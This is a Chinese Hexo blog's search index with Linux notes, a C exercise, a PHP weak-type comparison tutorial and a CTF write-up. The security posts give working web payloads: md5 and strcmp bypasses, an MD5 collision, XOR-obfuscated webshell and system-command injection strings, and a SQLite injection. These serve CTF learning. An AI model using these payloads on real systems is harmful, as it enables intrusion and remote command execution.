{"meta":{"title":"潜心","subtitle":"","description":"","author":"flag2020","url":"https://flag2020.top","root":"/"},"pages":[{"title":"Oh>..< 无法访问!","date":"2020-10-19T12:43:14.051Z","updated":"2020-10-18T03:43:51.595Z","comments":true,"path":"404.html","permalink":"https://flag2020.top/404.html","excerpt":"","text":"#no{ position: relative; top: 30%; left: 50%; -webkit-transform: translate(-50%, 32%); -moz-transform: translate(-50%, 32%); -ms-transform: translate(-50%, 32%); -o-transform: translate(-50%, 32%); transform: translate(-50%, 32%); font-size: 24px; line-height: 72px; margin-bottom: 36px; white-space: nowrap; text-overflow: ellipsis; overflow: hidden; } 404 Oh>..< 我找不到回家的路了"},{"title":"about","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-19T14:42:51.519Z","comments":true,"path":"about.html","permalink":"https://flag2020.top/about.html","excerpt":"","text":"关于 本博客主题来自 https://shen-yu.gitee.io/ 一个安静且优雅的 Hexo 主题 GitHub：https://github.com/Shen-Yu/hexo-theme-ayer"},{"title":"about","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-19T13:00:26.348Z","comments":true,"path":"about.html","permalink":"https://flag2020.top/about.html","excerpt":"","text":"关于 本博客主题来自 https://shen-yu.gitee.io/ 一个安静且优雅的 Hexo 主题 GitHub：https://github.com/Shen-Yu/hexo-theme-ayer"},{"title":"时间轴","date":"2020-05-10T03:33:00.000Z","updated":"2020-10-18T03:43:51.596Z","comments":true,"path":"axis.html","permalink":"https://flag2020.top/axis.html","excerpt":"","text":"时间轴 加载中…… if(n){ 加载失败。}"},{"title":"友情链接","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-18T03:43:51.596Z","comments":true,"path":"link.html","permalink":"https://flag2020.top/link.html","excerpt":"","text":"友情链接 加载中…. if(n){ 加载失败。}"},{"title":"留言板","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-18T07:59:34.518Z","comments":true,"path":"valine.html","permalink":"https://flag2020.top/valine.html","excerpt":"","text":"留言板，请大佬任意发炎如果有什么问题或者反馈都可以发送在评论区添加友情链接传送带"},{"title":"categories","date":"2020-11-11T16:47:02.379Z","updated":"2020-11-11T16:47:02.379Z","comments":true,"path":"categories/index.html","permalink":"https://flag2020.top/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2020-11-11T16:45:50.007Z","updated":"2020-11-11T16:45:50.007Z","comments":true,"path":"friends/index.html","permalink":"https://flag2020.top/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-11-11T16:48:42.729Z","updated":"2020-11-11T16:48:14.888Z","comments":true,"path":"tags/index.html","permalink":"https://flag2020.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"学习笔记——Linux","slug":"学习笔记——Linux","date":"2020-11-12T14:00:00.000Z","updated":"2020-11-12T14:10:05.292Z","comments":true,"path":"2020/11/12/学习笔记——Linux/","link":"","permalink":"https://flag2020.top/2020/11/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Linux/","excerpt":"Linux是开源的操作系统，系统特点有：开放性（开源）、多用户、多任务、良好的用户界面、优异的性能与稳定性等等。 学习笔记目录： 文件目录结构 终端 路径 指令","text":"Linux是开源的操作系统，系统特点有：开放性（开源）、多用户、多任务、良好的用户界面、优异的性能与稳定性等等。 学习笔记目录： 文件目录结构 终端 路径 指令 文件目录结构 bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。 dev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要挂载（类似windows下的分配盘符）。 etc：该目录主要存储一些配置文件。 home：表示“家”，表示除了root用户以外其他用户的家目录，类似于windows下的User/用户目录。 mnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。 proc：process，表示进程，该目录中存储的是Linux运行时候的进程。 root：该目录是root用户自己的家目录。 sbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。 tmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。 usr：存放的是用户自己安装的软件。类似于windows下的program files。 var：存放的程序/系统的日志文件的目录。 终端 kali：当前终端登录的用户名 @：发音at，表示”在“ kali：当前登录的主机名 ~/桌面：当前终端的工作目录 $：身份识别符，如果是超级管理员登录则显示#，否则显示$符号 超级管理员终端界面如下： 路径路径可以分为两种：相对路径和绝对路径 相对路径： ./：表示当前目录下；../：表示当前目录下 绝对路径： /：从根目录下寻找对应路径 在Linux中有一个特殊的符号“~”，表示当前用户的家目录。 指令Linux指令通用格式 #指令主体（空格） [选项]（空格） [操作对象] 一个指令可以包含多个选项 操作对象也可以是多个 ls(list) ls 列出当前工作目录下的所有文件/文件夹的名称 ls 路径 列出指定路径下的所有文件/文件夹的名称 ls 选项 路径 ls -l 路径 -l：表示list，表示以详细列表的形式进行展示 ls -a 路径 -a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹） ls -lh 路径 -lh：-a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹） pwd(print working directory) pwd 打印当前工作目录 cd(change directory) cd 路径 切换到路径所在目录 mkdir(make directory) mkdir 路径 创建目录，可以是文件夹名称也可以是包含名称的一个完整路径 mkdir -p 路径 当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错 mkdir 路径1 路径2 路径3 … 表示一次性创建多个目录 touch创建文件 touch 文件路径 文件路径可以是直接的文件名也可以是路径，touch也可以同时创建多个文件 clear clear 清屏 cp(copy) cp 被复制的文档路径 文档被复制到的路径 复制文档到新路径下的位置，在复制过程中是可以对新位置的文件重命名的 cp -r 被复制的文件夹路径 文件夹被复制到的路径 -r表示递归复制 mv(move) mv 需要移动的文档路径 需要保存的位置路径 移动文档到新位置，原始文件在移动后不在原始位置 mv 需要移动的文件夹路径 需要保存的位置路径 移动一个文件夹，同移动文档 注： 在Linux中重命名的命令也是mv，语法和移动语法一样 如：重命名根目录下的a.txt为b.txt mv /a.txt /b.txt rm(remove) rm 选项 需要移除的文档路径 rm -f 需要移除的文档路径 force：表示强制删除，不提示是否删除 rm -r 需要移除的文件夹路径 -r：表示递归，删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项 rm -rf 文档路径/文件夹路径/… 删除多个文档和文件夹 注： 要删除一个目录下有公共特性的文档，例如以test开头的文档，可以使用通配符* rm -f test* 表示强制删除只要文件是以test开头的，后续字符不管的文档 输出重定向一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。 &gt;：覆盖输出，会覆盖掉原先的文件内容 &gt;&gt;：追加输出，不会覆盖原始文件内容，会在原始内容末尾继续添加 正常执行的指令 &gt;/&gt;&gt; 文件的路径 注：文件可以不存在，不存在则新建 如：使用覆盖重定向，保存 ls -lah 的执行结果到当前目录下的 ls.txt ls -lah &gt; ls.txt cat cat 文档路径 直接打开一个文档，结果输出在终端 cat 文档路径1 文档路径2 … 文档路径n &gt; 文档路径x 配合输出重定向，将文档路径1到文档路径n的内容合并到文档路径x 管道管道符：| 管道一般可以用于“过滤”，“特殊”，“扩展处理”。 指令A | 指令B 指令A的正确输出作为指令B的操作对象 grep指令：主要用于过滤 du -sh du -sh 目录路径 查看目录的真实大小 -s：summaries，只显示汇总的大小 -h：表示以高可读性的形式进行显示 如：统计”/etc“目录实际大小 du -sh /etc/ date %F：等价于%Y-%m-%d %T：等价于%H:%M:%S 12345678%F：表示完整的年月日%T：表示完整的时分秒%Y：表示四位年份%m：表示两位月份（带前导0）%d：表示日期（带前导0）%H：表示小时（带前导0）%M：表示分钟（带前导0）%S：表示秒数（带前导0）","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://flag2020.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://flag2020.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP 弱类型比较问题","slug":"PHP 弱类型比较问题","date":"2020-10-29T15:00:00.000Z","updated":"2020-11-11T15:37:02.697Z","comments":true,"path":"2020/10/29/PHP 弱类型比较问题/","link":"","permalink":"https://flag2020.top/2020/10/29/PHP%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98/","excerpt":"字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。 bool true和任何比较都相等，除了0和false，因为0认为是bool false。 md5或者sha不能加密数组，所以在加密数组的时候会返回false。 “0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。 只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即0e\\d+的字符串 == ‘0’ 为true。 PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。","text":"字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。 bool true和任何比较都相等，除了0和false，因为0认为是bool false。 md5或者sha不能加密数组，所以在加密数组的时候会返回false。 “0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。 只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即0e\\d+的字符串 == ‘0’ 为true。 PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。 字符串 md5() 240610708 0e462097431906509019562988736854 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 参考： PHP官方手册——比较运算符 PHP 弱类型比较总结 PHP 弱类型比较问题PHP是一门弱类型语言，存在弱类型比较问题。 “==”与“===”== 数据类型不一样的时候会将数据类型转换为相同的再进行比较 === 除了对数据的值进行比较还会对数据的类型进行比较 123456789&lt;?php$o = $_GET[&#x27;o&#x27;];if(is_numeric($o))&#123; die(&quot;no hack!!&quot;);&#125;if($o==520)&#123; echo &quot;U are right!&quot;;&#125;?&gt; 输入520，则：no hack!! 输入520a，则：U are right! 1234&lt;?phpecho intval(&#x27;520a&#x27;).&#x27;&lt;br&gt;&#x27;;echo intval(&#x27;a520&#x27;);?&gt; 520 a 12345&lt;?phpvar_dump(&#x27;1&#x27;==1);echo &quot;&lt;br&gt;&quot;;var_dump(&#x27;1&#x27;===1);?&gt; bool(true)bool(false) 1234&lt;?phpvar_dump(&#x27;0e12&#x27; == &#x27;0e34&#x27;);var_dump(&#x27;0e12&#x27; === &#x27;0e34&#x27;);?&gt; bool(true)bool(false) switch弱类型比较问题switch中同样存在弱类型比较问题，原理和上面类似 12345678910111213&lt;?php $i =&quot;3a&quot;; switch ($i) &#123; case 0: case 1: case 2: echo &quot;this is two&quot;; break; case 3: echo &quot;flag&quot;; break; &#125;?&gt; 最终输出 flag 字符串和数字比较字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。 如：”a”或”a1”是不能转换为数字的字符串，而”1”或”1a”是可以转换为数字的字符串 123456789&lt;?phpvar_dump(&#x27;a&#x27; == 0);var_dump(&#x27;a&#x27; == 1);var_dump(&#x27;1&#x27; == 1);var_dump(&#x27;1a&#x27; == 1);var_dump(&#x27;a1&#x27; == 1);var_dump(&#x27;12a&#x27; == 1);?&gt; bool(true)bool(false)bool(true)bool(true)bool(false)bool(false) 布尔值true和任意比较bool true和任何比较都相等，除了0和false，因为0认为是bool false。 123456&lt;?phpvar_dump(true == 0);var_dump(true == &#x27;False&#x27;);var_dump(true == 2);var_dump(true == &#x27;2&#x27;);?&gt; bool(false)bool(true)bool(true)bool(true) md5()、sha1()哈希函数相等问题123456789101112&lt;?phpif (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;]))&#123; if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &#123; if (md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) echo &#x27;flag&#x27;; else echo &#x27;Wrong&#x27;; &#125;&#125;?&gt; 要得到flag，得想办法让a和b的值不相等，但md5加密后的值相等。 由于md5或者sha不能加密数组，所以在加密数组的时候会返回false。 利用这点，给a和b分别传参两个不同的数组，就可以得到flag。 1?a[]&#x3D;1&amp;b[]&#x3D;2 十六进制比较问题123456789101112131415161718192021&lt;?phpfunction fun($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;if( fun($_GET[&#x27;a&#x27;]) ) echo &#x27;flag&#x27;;else echo &#x27;Wrong&#x27;;?&gt; ord() 函数返回字符串的首个字符的 ASCII 值。 这道题的意思就是要求输入一个key，然后这个key必须等于54975581388，但是在自定义的函数里面又不允许出现数字1到9，正好54975581388=0xccccccccc这样就绕过了检测。 “0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。 1234&lt;?phpvar_dump(0x1e240 == 123456);var_dump(54975581388 == 0xccccccccc);?&gt; bool(true)bool(true) 1?a&#x3D;0xccccccccc hash值和字符串“0”比较在比较的时候，当出现xex模式，将会当做科学计数法进行比较。 而只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即0e\\d+的字符串 == ‘0’ 为true。 12345678910111213&lt;?php$str1 = &quot;a&quot;;echo md5($str1);var_dump(md5($str1) == &#x27;0&#x27;);$str2 = &quot;s224534898e&quot;;echo md5($str2);var_dump(md5($str2) == &#x27;0&#x27;);$str3 = &#x27;a1b2edaced&#x27;;echo md5($str3);var_dump(md5($str3) == &#x27;0&#x27;);?&gt; 0cc175b9c0f1b6a831c399e269772661bool(false)0e420233178946742799316739797882bool(true)0e45ea817f33691a3dd1f46af81166c4bool(false) PHP 组合比较运算符组合比较运算符，符号为：&lt;=&gt; 1$c = $a &lt;=&gt; $b; 相当于 1$c = $a &gt; $b ? 1 : ( $a==$b ? 0 : -1 ); 当 $a &gt; $b 时，$c = 1 当 $a == $b 时，$c = 0 当 $a &lt; $b 时，$c = -1 123456&lt;?php$a = 1;$b = 2;$c = $a &lt;=&gt; $b;echo $c;?&gt; -1 组合比较运算符同样存在 == 弱类型比较问题，原理同 “==”与“===” 123456&lt;?php$a = &#x27;0e12&#x27;;$b = &#x27;0e34&#x27;;$c = $a &lt;=&gt; $b;echo $c;?&gt; 0 PHP strcmp() 函数1int strcmp ( string $str1 , string $str2 ) 根据ACSII表进行比较，从左到右依次进行，出现不同就停止比较，返回结果。 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 1234&lt;?php// 二进制安全比较字符串（区分大小写）echo strcmp(&#x27;Hello&#x27;, &#x27;hello&#x27;);?&gt; -1 因为’H’的ASCII值比’h’的小，所以返回负数 12345678910&lt;?php$password=&quot;***&quot;;if(isset($_GET[&#x27;password&#x27;]))&#123; if (strcmp($_GET[&#x27;password&#x27;], $password) == 0) echo &quot;flag&quot;; else echo &quot;Wrong&quot;;&#125;?&gt; PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。 1?password[]&#x3D;a 题目weak_type112345678910&lt;?phphighlight_file(__FILE__);$o = $_GET[&#x27;o&#x27;];if(is_numeric($o))&#123; die(&quot;no hack!!&quot;);&#125;if($o==520)&#123; echo file_get_contents(&#x27;/flag&#x27;);&#125;?&gt; 1&#x2F;?o&#x3D;520a weak_type312345678910111213141516171819202122&lt;?phphighlight_file(__FILE__);function noother_says_correct($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;$flag=file_get_contents(&quot;/flag&quot;);if(noother_says_correct($_GET[&#x27;key&#x27;])) echo $flag;else echo &#x27;access denied&#x27;;?&gt; 1&#x2F;?key&#x3D;0xccccccccc weak_type412345678910&lt;?phphighlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123; if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]) if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) echo file_get_contents(&quot;/flag&quot;); else print &#x27;Wrong.&#x27;;&#125;?&gt; 1a[]&#x3D;1&amp;b[]&#x3D;2 weak_type512345678910111213141516171819&lt;?phpif (isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]))&#123; $logined = true; $username = $_GET[&#x27;username&#x27;]; $password = $_GET[&#x27;password&#x27;]; if (!ctype_alpha($username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo &quot;flag&quot;; &#125; else&#123; echo &quot;login failed!&quot;; &#125;&#125;?&gt; isset() 检测变量是否设置 ctype_alpha函数功能就是检测是否是字符 is_numeric 检测变量是否为数字或数字字符串 username必须是字母，password必须是数字，再将传入的username和password进行md5加密后进行比较且结果要相等。 如果md5加密后的值是0e开头，这样就存在弱类型比较问题就可以通过，所以要想得到flag，得寻找纯字母和纯数字md5加密后是0e开头的值。 123&lt;?phpvar_dump(md5(&#x27;QNKCDZO&#x27;) == md5(&#x27;240610708&#x27;));?&gt; bool(true) 1?username&#x3D;QNKCDZO&amp;password&#x3D;240610708 weak_type6123456789&lt;?phphighlight_file(__FILE__);$cmd=$_GET[&#x27;cmd&#x27;];if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`;&#125; else &#123; echo (&quot;md5 is funny ~&quot;);&#125;?&gt; 尝试使用weak_type4的a[]=1&amp;b[]=2，发现不行，测试后发现数组被强制装换为字符串后都是Array 123456&lt;?php$a = $_POST[&#x27;a&#x27;];$b = $_POST[&#x27;b&#x27;];echo &quot;a=&quot;.(string)$a.&quot;&lt;br&gt;&quot;;echo &quot;b=&quot;.(string)$b;?&gt; a=Array b=Array 参考MD5碰撞后，用burp suite抓包 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 天融信面试题12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;html&gt;&lt;body&gt; &lt;form action&#x3D;&quot;index.php&quot; class&#x3D;&quot;authform&quot; method&#x3D;&quot;post&quot; accept-charset&#x3D;&quot;utf-8&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;Unbreakable Random&lt;&#x2F;legend&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;s&quot; name&#x3D;&quot;s&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;seed&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;h&quot; name&#x3D;&quot;h&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;hash&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Check&quot; &#x2F;&gt; &lt;div class&#x3D;&quot;return-value&quot; style&#x3D;&quot;padding: 10px 0&quot;&gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;form&gt;&lt;?phpfunction gen_secured_random() &#123; &#x2F;&#x2F; cause random is the way $a &#x3D; rand(1337,2600)*42; $b &#x3D; rand(1879,1955)*42; $a &lt; $b ? $a ^&#x3D; $b ^&#x3D; $a ^&#x3D; $b : $a &#x3D; $b; return $a+$b;&#125;function secured_hash_function($plain) &#123; &#x2F;&#x2F; cause md5 is the best hash ever $secured_plain &#x3D; sanitize_user_input($plain); return md5($secured_plain);&#125;function sanitize_user_input($input) &#123; &#x2F;&#x2F; cause someone told me to never trust user input $re &#x3D; &#39;&#x2F;[^a-zA-Z0-9]&#x2F;&#39;; $secured_input &#x3D; preg_replace($re, &quot;&quot;, $input); return $secured_input;&#125;if (isset($_GET[&#39;source&#39;])) &#123; show_source(__FILE__); die();&#125;require_once &quot;secret.php&quot;;if (isset($_POST[&#39;s&#39;]) &amp;&amp; isset($_POST[&#39;h&#39;])) &#123; $s &#x3D; sanitize_user_input($_POST[&#39;s&#39;]); $h &#x3D; secured_hash_function($_POST[&#39;h&#39;]); $r &#x3D; gen_secured_random(); if($s !&#x3D; false &amp;&amp; $h !&#x3D; false) &#123; if($s.$r &#x3D;&#x3D; $h) &#123; print &quot;Well done! Here is your flag: &quot;.$flag; &#125; else &#123; print &quot;Fail...&quot;; &#125; &#125; else &#123; print &quot;&lt;p&gt;Hum ...&lt;&#x2F;p&gt;&quot;; &#125;&#125;?&gt;&lt;p&gt;&lt;em&gt;&lt;a href&#x3D;&quot;index.php?source&quot;&gt;source code&lt;&#x2F;a&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 其中几个函数的作用 gen_secured_random() 虽然不知道$a ^= $b ^= $a ^= $b的结果会是怎么样的，但$a+$b的值的长度都是六位数 12345678910111213&lt;?phpfor($i = 1; $i &lt; 100; $i++)&#123; $a = rand(1337,2600)*42; $b = rand(1879,1955)*42; $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b; if(strlen($a+$b) != 6)&#123; echo &quot;不是6位数&quot;; break; &#125;&#125;echo &quot;i = &quot;.$i;?&gt; i = 100 sanitize_user_input($input) 对传进来的$input进行过滤，将不是26个字母和数字的字符替换为空 secured_hash_function($plain) 调用sanitize_user_input()函数，对传进来的$plain进行过滤，返回过滤后的md5值 12345678$s = sanitize_user_input($_POST[&#x27;s&#x27;]);$h = secured_hash_function($_POST[&#x27;h&#x27;]);$r = gen_secured_random();if($s != false &amp;&amp; $h != false) &#123; if($s.$r == $h) &#123; print &quot;Well done! Here is your flag: &quot;.$flag; &#125;&#125; 对传进来的$s，过滤掉其它字符，剩下字母和数字 $h也过滤掉后进行md5加密 $r为一个6位数的数 如果$s和$h都不等于false 以及 $s拼接上$r后如果和$h相等的话，就可以得到flag 这里的==存在弱类型比较问题 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 1234&lt;?phpvar_dump(&quot;0e123456789&quot; == &quot;0&quot;); //bool(true)var_dump(&quot;0e123456789&quot; === &quot;0&quot;); //bool(false)?&gt; 已知用md5加密s878926199a后的结果是以0e开头的 1234&lt;?php echo md5(&quot;s878926199a&quot;); //0e545993274517709034328855841020?&gt; 所以$h=s878926199a，md5加密后为32位，减去$r的6位后，也就是说$s是以0e开头的26位数 可以是$s=0e111111111111111111111111 即s=0e111111111111111111111111&amp;h=s878926199a 当然可以是这样的 s=0e&amp;h=s878926199a","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"一道ACM测试赛的题目","slug":"一道ACM测试赛的题目","date":"2020-10-29T11:00:00.000Z","updated":"2020-11-11T15:11:40.522Z","comments":true,"path":"2020/10/29/一道ACM测试赛的题目/","link":"","permalink":"https://flag2020.top/2020/10/29/%E4%B8%80%E9%81%93ACM%E6%B5%8B%E8%AF%95%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AE/","excerpt":"题目：查找缺失的元素 太久没做类似这种题了，一道很简单的题目，竟然用了20多分钟才做出来😥 查找缺失的元素描述：给定一个数组，找出其中的最大值n，输出[0,n]在该数组中缺失的元素。 输入：输入任意个自然数，当输入为-1时，结束输入。 输出：输出缺失的元素，每两个元素之间用空格分隔。","text":"题目：查找缺失的元素 太久没做类似这种题了，一道很简单的题目，竟然用了20多分钟才做出来😥 查找缺失的元素描述：给定一个数组，找出其中的最大值n，输出[0,n]在该数组中缺失的元素。 输入：输入任意个自然数，当输入为-1时，结束输入。 输出：输出缺失的元素，每两个元素之间用空格分隔。 例1： 输入：0 1 4 -1 输出：2 3 例2： 输入：5 8 -1 输出：0 1 2 3 4 6 7 分析① 输入数字，直到输入-1则停止输入 ② 找到数组中的最大值 ③ 输出[0,n]在该数组中缺失的元素 ① 输入数字，直到输入-1则停止输入1234567891011121314#include&lt;stdio.h&gt;int main()&#123; int a[100]; int i = 0; int x; scanf(&quot;%d&quot;, &amp;x); while(x != -1)&#123; a[i++] = x; scanf(&quot;%d&quot;, &amp;x); &#125; return 0;&#125; ② 找到数组中的最大值12345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int a[100]; int i = 0; int x; scanf(&quot;%d&quot;, &amp;x); while(x != -1)&#123; a[i++] = x; scanf(&quot;%d&quot;, &amp;x); &#125; int max = a[0]; int j; for(j=1; j&lt;i; j++)&#123; if(a[j] &gt; max)&#123; max = a[j]; &#125; &#125; return 0;&#125; ③ 输出[0,n]在该数组中缺失的元素1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;stdio.h&gt;int main()&#123; int a[100]; int i = 0; int x; scanf(&quot;%d&quot;, &amp;x); while(x != -1)&#123; a[i++] = x; scanf(&quot;%d&quot;, &amp;x); &#125; int max = a[0]; int j; for(j=1; j&lt;i; j++)&#123; if(a[j] &gt; max)&#123; max = a[j]; &#125; &#125; int tag = 0; int k = 0; for(k=0; k&lt;max; k++)&#123; for(j=0; j&lt;i; j++)&#123; if(k == a[j])&#123; tag = 1; break; &#125; &#125; if(tag == 0)&#123; printf(&quot;%d&quot;, k); if(k != max-1)&#123; printf(&quot; &quot;); &#125; &#125;else&#123; tag = 0; &#125; &#125; return 0; &#125;","categories":[{"name":"其它","slug":"其它","permalink":"https://flag2020.top/categories/%E5%85%B6%E5%AE%83/"}],"tags":[{"name":"其它","slug":"其它","permalink":"https://flag2020.top/tags/%E5%85%B6%E5%AE%83/"}]},{"title":"菜鸡划水队 writeup","slug":"菜鸡划水队writeup","date":"2020-10-23T16:00:00.000Z","updated":"2020-11-11T15:38:08.638Z","comments":true,"path":"2020/10/24/菜鸡划水队writeup/","link":"","permalink":"https://flag2020.top/2020/10/24/%E8%8F%9C%E9%B8%A1%E5%88%92%E6%B0%B4%E9%98%9Fwriteup/","excerpt":"比赛：2020全国工业互联网安全技术技能大赛 学生组 正如队名一样，我们只是来划水的签到选手","text":"比赛：2020全国工业互联网安全技术技能大赛 学生组 正如队名一样，我们只是来划水的签到选手 签到拼图，拼完就可以得到flag flag 1flag&#123;welcome_to_chinaiisc2020&#125; SimpleCalculator不知道怎么用这个计算器来计算，查看网页源码，尝试用 ?search 传参 尝试使用异或绕过 12345&lt;?php$a = urldecode(&#x27;%ff%ff%ff%ff&#x27;);$b = urldecode(&#x27;%a0%b8%ba%ab&#x27;);echo $a^$b;//输出_GET 构造phpinfo() 123$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo 构造webshell 123$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27])//$&#123;_GET&#125;[assert]($&#123;_GET&#125;[eval($_POST[%27cmd%27])]); 使用蚁剑查看 http://eci-2ze7n0wiyptutv9upaxm.cloudeci1.ichunqiu.com/flag.php?search=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27]) 在网站根目录下找到flag flag 1flag&#123;08768680-a69a-42f1-b515-4220cf7e9a0d&#125; 其它方法： 123?search=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat%20/flag//?search=$&#123;_GET&#125;&#123;system&#125;($&#123;_GET&#125;&#123;cat /flag&#125;); SQLManager参考文章：https://www.anquanke.com/post/id/200927#h3-6 题目说这是个简易的SQLite管理器。 而SQLite管理器有一个自动创建的库sqlite_master，里面保存了所有表名以及创建表时的create语句。在创建表时可以用as来复制另一个表中的数据，所以我们可以从中获取到flag的表名和字段名。 在建表界面用burp suite抓包，重放包得到flag的表名和字段名 table_name=a as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=INTEGER 这里可以得知flag所在的表：flag_Y0U_c4nt_GUESS，以及所在的字段：flag_ThE_C0lumn 删表后再次抓包，表名为 b ，继续用burp suite重放包 